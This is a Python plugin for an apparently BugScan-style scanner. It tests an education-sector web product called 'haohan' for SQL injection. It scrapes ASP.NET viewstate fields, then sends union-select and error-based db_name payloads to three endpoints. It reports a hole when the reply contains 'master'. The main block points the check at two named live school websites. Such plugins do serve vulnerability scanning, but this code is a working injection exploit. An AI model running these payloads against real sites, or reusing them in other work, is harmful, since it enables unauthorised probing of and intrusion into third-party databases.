#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105296
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105378
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105721

import re
from urllib import quote

def findVIEWSTATE(url):
    m_values=[]
    code, head, res, errcode, _ = curl.curl2(url)
    m1=re.search("__VIEWSTATE.*?value=\"(.*?)\"",res,re.S)
    m2=re.search("__EVENTVALIDATION.*?value=\"(.*?)\"",res,re.S)
    if m1 and m2:
        m_values.append(m1.group(1))
        m_values.append(m2.group(1))
        return m_values
    else:
        return ['','']
  

def assign(service, arg):
    if service == "haohan":
        return True, arg
        
        
        
def audit(arg):
    
    payloads = [
        'Resource/search/search.aspx',
        'Inedu3In1/components/xsjz.aspx',
        ]
    postdatas = {
        payloads[0]:'&Title=1%27%20union%20all%20select%20db_name%281%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--&username=&KeyWord=&sDate=&eDate=&btnsearch=&__EVENTVALIDATION=',
        payloads[1]:'&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&classid=0&TB_Search=1%27%20and%20db_name%281%29%3E1--&IB_Search.x=4&IB_Search.y=13&__EVENTVALIDATION='
        }
    for payload in payloads:
        url = arg + payload 
        viewstate_value=findVIEWSTATE(url)
        postdata = '__VIEWSTATE=' + quote(viewstate_value[0]) + postdatas[payload] + quote(viewstate_value[1])
        code, head, res, errcode, _ = curl.curl2(url,postdata)
        if code == 500 and 'master' in res :
            security_hole(arg+payload)
        
        
    payload = 'Resource/search/SearchList.aspx?chk_Gra=1'
    getdata = ')%20and%20db_name%281%29%3E0--'
    url = arg + payload + getdata
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500 and 'master' in res :
        security_hole(arg+payload)



if __name__ == '__main__':
    from dummy import *
    audit(assign('haohan','http://www.xfls.net/')[1])
    audit(assign('haohan','http://www.hzlcyhxx.com/')[1])

